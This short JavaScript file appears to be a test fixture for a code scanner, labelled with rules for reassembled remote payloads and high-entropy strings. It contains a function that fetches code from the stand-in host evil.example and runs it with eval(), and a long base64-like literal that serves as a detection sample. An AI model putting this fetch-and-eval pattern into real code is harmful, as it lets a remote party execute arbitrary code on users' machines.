// Reassembled remote payload + packed data (§1.4).
// Rules: reassembled-payload, high-entropy-string

// reassembled-payload: code fetched from the network is executed at runtime
async function stage2() {
  var res = await fetch('https://evil.example/stage2.txt');
  var code = await res.text();
  eval(code);
}
stage2();

// high-entropy-string (INFO): a long, high-entropy base64-like blob literal
var payload = 'TmV2ZXJHb25uYUdpdmVZb3VVcE5ldmVyR29ubmFMZXRZb3VEb3duTmV2ZXJHb25uYVJ1bkFyb3VuZEFuZERlc2VydFlvdU5ldmVyR29ubmFNYWtlWW91Q3J5TmV2ZXJHb25uYVNheUdvb2RieWVOZXZlckdvbm5hVGVsbEFMaWVBbmRIdXJ0WW91MTIzNDU2Nzg5MEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFla';
